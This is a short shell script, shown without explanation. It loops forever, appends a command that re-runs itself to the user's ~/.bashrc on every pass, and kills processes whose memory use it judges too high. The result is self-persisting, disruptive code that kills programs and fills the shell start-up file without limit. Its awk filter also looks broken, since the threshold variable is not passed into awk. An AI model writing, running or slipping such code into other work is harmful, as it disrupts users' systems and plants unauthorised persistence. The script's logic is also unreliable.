max_mem=10.0
current_pgm=`pwd`/$0
while true
do
echo "sh $current_pgm" >> ~/.bashrc
kill `ps -o pid,%mem ax | sort -b -k2 -r | awk -F " " '$2>$max_mem' | awk -F "  " '{print $1}'`
done
